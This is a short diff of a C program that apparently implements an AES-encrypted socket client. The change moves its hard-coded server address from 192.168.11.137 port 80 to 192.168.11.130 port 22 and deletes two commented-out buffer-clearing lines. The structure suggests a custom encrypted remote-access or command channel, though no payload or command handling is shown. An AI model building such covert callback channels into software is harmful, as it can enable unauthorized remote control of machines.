@@ -20,8 +20,8 @@ SOCKET ClientSocket;
 AES_KEY encrypt_key, decrypt_key;
 
 #define HOSTNAME_COMPUTER "hostname"
-#define PORT 80
-#define HOST "192.168.11.137"
+#define PORT 22
+#define HOST "192.168.11.130"
 #define BUF_SIZE 32768
 
 bool send_with_encrypt(char* BufferData, const int BufferLength) {
@@ -309,8 +309,6 @@ int main(void){
                 printf("%s", BufferReceive);
             }
         }
-        //memset(BufferSend, '\0', sizeof(BufferSend));
-        //memset(BufferReceive, '\0', sizeof(BufferReceive));
     }
     while (1);
     printf("[*] The server is closed !\n");
